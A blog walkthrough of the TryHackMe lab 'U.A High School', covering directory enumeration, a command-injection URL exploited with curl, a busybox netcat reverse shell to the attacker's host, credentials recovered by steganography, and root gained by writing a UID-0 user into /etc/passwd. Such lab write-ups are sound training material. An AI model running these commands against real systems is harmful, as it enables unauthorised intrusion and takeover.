---
title: "U.A High School"
description: Writeup of the TryHackMe challenge U.A High School
date: 2024-10-28 00:00:00 +0000
categories: [Writeup, Red Team]
tags: [ctf, linux, web, thm, writeup, nmap, ssh, hexeditor, xxd, gobuster]
pin: true
math: true
mermaid: true
comments: true
media_subpath: /images/uahs
img_path: /images/uahs
image:
  path: oneforall.jpg
---

 This is a walkthrough of the TryHackMe room [U.A High School](https://tryhackme.com/room/uahighschool) by [DarkStar7471](https://tryhackme.com/p/DarkStar7471). This is a beginner level room and is a great way to practice web enumeration and basic linux privilege escalation.

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> Objectives: Find the user and root flags
{: .prompt-info }
> Useful Tools: `NMAP`, `Gobuster`, `SSH`, `Hexeditor`
{: .prompt-tip }
<!-- markdownlint-restore -->

## Enumeration/Reconnaissance

### Scanning
Like any challenge, it is important to first do some enumeration to understand what services are running on the target machine. There are many ways to do this, such as port scanning with `NMAP`, or fuzzing directories to find hidden locations. In this case, I will be using a custom `Python` script to automate this process while we manually examine the target. I created this tool, and will be releasing it soon on my [GitHub](https://github.com/Z3R0-sec). This script just runs `NMAP` and `Gobuster` in the background and displays the results in a simple format. Below are the results of the scan:

![Screenshot](Screenshot_2.png){: width="972" height="589" .w-50 .normal}
![Screenshot](Screenshot_4.png){: width="972" height="589" .w-50 .normal} 

### Checking out the Website
We only see two ports open, `22` and `80`. There is also an `/assets`{: .filepath} directory that we will visit later. For now, let's walk the website and see what we can find.

![Screenshot](Screenshot_1.png){: width="972" height="589" .w-50 .normal}![Screenshot](Screenshot_3.png){: width="972" height="589" .w-50 .normal} 

We are greeted with a basic website and limited functionality. Most of the links don't work, but there is a contact page with a form we can will out. I initially thought it might be weak to some form of command injection, but after running a few tests, there was nothing to be found. I then decided to run another `Gobuster` on the website to see if there were any hidden directories or files in the `/assets`{: .filepath} directory.

### Gobuster ... Again
I ran `Gobuster` on the `/assets`{: .filepath} directory using the following command:
  
  ```shell
  gobuster dir -u http://<Target_IP>/assets -w /usr/share/wordlists/dirb/big.txt -t 150 -x php,txt,html
  ``` 

![Screenshot](Screenshot_6.png){: width="972" height="589" }

## Dirsearch and Finding a Vulnerability
This returned a few files, but the one that caught my eye was `index.php`, which had a status code of 200. This is why it is important to indicate file types using the `-x` flag. From this point, I wasn't able to find anything of use, so I decided to use another tool, `dirsearch`, to see if I could find anything else. `Dirsearch` is a great tool for finding 
potentially hidden directories and files on a website, using its extensive wordlist. Let's use this on the `index.php` file we found earlier:

  ```shell
  dirsearch -u http://<Target_IP>/assets/index.php 
  ```
![Screenshot](Screenshot_7.png){: width="972" height="589" }

There is a strange result: `/assets/index.php/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=dir`{: .filepath}. This looks like potentially a command injection vulnerability. Let's try to exploit this. We can do this either in the terminal using `curl` or `wget`, or we can use a browser. As shown below, I used curl, but the results returned are encoded using `base64`. We can decode this using `base64 -d`{: .filepath}. Running the folllowing commands will verify that we have command injection:

  ```shell
  curl http://<Target_IP>/assets/index.php/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=dir | base64 -d
  ```
   ```shell
  curl http://<Target_IP>/assets/index.php/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=pwd | base64 -d
  ```
![Screenshot](Screenshot_25.png){: width="972" height="589" }
![Screenshot](Screenshot_10.png){: width="972" height="589" }

We can see a directory listing and changing the end of the string to `pwd`{: .filepath} successfully runs, which indicates that we have command injection.

## Exploiting Command Injection and Gaining a Shell
Knowing that we have command injection, we can now try to get a reverse shell. After checking if `busybox` is installed, I set up a `netcat` listener on my machine and navigated to this URL:

  ```shell
  curl http://<Target_IP>/assets/index.php/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=busybox%20nc%20<Your_IP>%20<Your_Port>%20-e%20/bin/sh
  ```
![Screenshot](Screenshot_11.png){: width="972" height="589" }

## Initial Access
We now have our shell, lets upgrade the shell and investigate the system further.
![Screenshot](Screenshot_12.png){: width="972" height="589" }

### Following the Crumbs
We find a directory called `Hidden_Content`{: .filepath} with a file inside called `passphrase.txt`{: .filepath}. This contained another encoded string, which we can decode using `base64 -d`{: .filepath}. This revealed a password, which we will need later.

![Screenshot](Screenshot_13.png){: width="972" height="589" }

I should mention there was an unused image titled `oneforall.jpg`{: .filepath} in the `/assets`{: .filepath} directory. Using `xxd` to examine the image file, we can see that it is actually a PNG file. We can alter the [magic numbers](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5)[^1] to convert it back to a PNG file and view the image, or if needed, extract any files or text that were hidden using Stegnography. This is a common technique used to hide files in plain sight.

![Screenshot](Screenshot_14.png){: width="972" height="589" }

After changing the filetype, we can then use `steghide` to extract any hidden files. We were able to make use of the passphrase we found earlier to extract the hidden file. Viewing the `creds.txt`{: .filepath} file, we find a username and password.

![Screenshot](Screenshot_16.png){: width="972" height="589" }

### SSH Access and User Flag
With the credentials we found, we can now SSH into the machine and grab the user flag:

  ```shell
  ssh <username>@<Target_IP>
  ```

![Screenshot](Screenshot_18.png){: width="972" height="589" }

## Privilege Escalation
After logging in, we can see that we are in a restricted shell. We can check the permissions of the user by running `sudo -l`{: .filepath}. This will show us what commands we can run as sudo. There is a script called `feedback.sh`{: .filepath} that can possibly be altered to give us a root shell.

![Screenshot](Screenshot_20.png){: width="972" height="589" }

Let's check the contents of the script:

![Screenshot](Screenshot_21.png){: width="972" height="589" }

The script takes user input and is able to write to files. I tested this by running the script and writing to a file in the `/tmp`{: .filepath} directory. We can use this to create and add a new user with the SUID bit set, which will allow us to run commands as root when we log in as that new user. Back on my host machine, I created a password hash for the new user in the proper format using the following command:

  ```shell
  mkpasswd -m md5crypt -s
 <password>
  ```
![Screenshot](Screenshot_22.png){: width="972" height="589" }

### Root Flag
We can then prepend the username we want to use, run the script back in the SSH session, and add the following line to the prompt to add the new user to the system:

  ```shell
  newuser:passwordhash:0:0:root:/root:/bin/bash > /etc/passwd
  ```
![Screenshot](Screenshot_23.png){: width="972" height="589" }

We can then log in as the new user and grab the root flag:

![Screenshot](Screenshot_24.png){: width="972" height="589" }

# Conclusion
This was a fun room that required a bit of enumeration and some basic exploitation techniques. We were able to find a command injection vulnerability, exploit it to gain a shell, and then escalate our privileges to root. This room is great for beginners and is a good way to practice web enumeration and basic privilege escalation techniques. 

### Useful Resources

[^1]: Source: [Magic Numbers](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5)